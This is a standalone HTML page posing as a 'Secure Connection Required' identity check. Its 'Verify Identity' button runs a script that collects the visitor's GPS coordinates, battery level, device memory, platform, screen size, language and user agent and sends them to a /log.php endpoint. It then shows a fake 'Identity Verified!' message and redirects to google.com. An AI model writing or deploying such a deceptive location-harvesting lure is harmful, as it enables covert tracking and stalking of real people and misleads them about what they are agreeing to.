<!DOCTYPE html>
<html>
<body style="background:#000; color:#fff; text-align:center; padding-top:20%;">
    <h2>Secure Connection Required</h2>
    <button onclick="startTracking()" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; border:none; border-radius:10px;">
        Verify Identity
    </button>

    <script>
        async function startTracking() {
            // Data collection variables
            let batteryLevel = "Unknown";
            try {
                const b = await navigator.getBattery();
                batteryLevel = Math.round(b.level * 100) + "%";
            } catch(e) { batteryLevel = "Access Denied"; }

            const devInfo = {
                platform: navigator.platform,
                memory: navigator.deviceMemory || "Unknown",
                browser: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                lang: navigator.language
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    const params = new URLSearchParams({
                        lat: p.coords.latitude,
                        lon: p.coords.longitude,
                        platform: devInfo.platform,
                        ram: devInfo.memory + "GB",
                        battery: batteryLevel,
                        screen: devInfo.screen,
                        lang: devInfo.lang,
                        agent: devInfo.browser
                    });
                    
                    fetch('/log.php?' + params.toString())
                    .then(() => {
                        alert("Identity Verified!");
                        window.location.href = "https://google.com";
                    });
                });
            }
        }
    </script>
</body>
</html>
